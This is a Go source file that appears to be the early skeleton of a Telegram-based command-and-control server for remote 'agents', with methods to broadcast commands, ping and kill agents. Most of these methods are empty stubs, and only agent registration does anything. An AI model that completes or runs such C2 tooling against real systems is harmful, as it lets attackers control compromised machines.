package c2

import (
	"log"

	"telegram-c2/internal/pkg/config"
	"telegram-c2/internal/pkg/consts"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type TGC2 struct {
	bot *tgbotapi.BotAPI
}

type ITGC2 interface {
	BroadcastCommand(command string) error
	SendCommandToAgent(command string) error
	ListenForNewAgents() error
	RetrieveAgents() error
	PingAgent() error
	GetActiveAgents() error
	KillAgent() error
	KillAllAgents() error
}

func NewTGC2(c *config.Config) *TGC2 {
	println("Initing Telegram Bot")
	bot, err := tgbotapi.NewBotAPI(c.BotAPIToken)
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = true

	log.Printf("Authorized on account %s", bot.Self.UserName)

	return &TGC2{
		bot: bot,
	}
}

func (c2 *TGC2) BroadcastCommand(command string) error {
	return nil
}

func (c2 *TGC2) SendCommandToAgent() error {
	return nil
}

func (c2 *TGC2) ListenForNewAgents() error {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := c2.bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil && update.Message.Text == consts.NewAgentMessage { // If we got a message
			log.Printf("New Agent Caught")
			log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)

			msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
			msg.ReplyToMessageID = update.Message.MessageID

			c2.bot.Send(msg)
		}
	}
	return nil
}

func (c2 *TGC2) RetrieveAgents() error {
	return nil
}

func (c2 *TGC2) PingAgent() error {
	return nil
}

func (c2 *TGC2) GetActiveAgents() error {
	return nil
}

func (c2 *TGC2) KillAgent() error {
	return nil
}
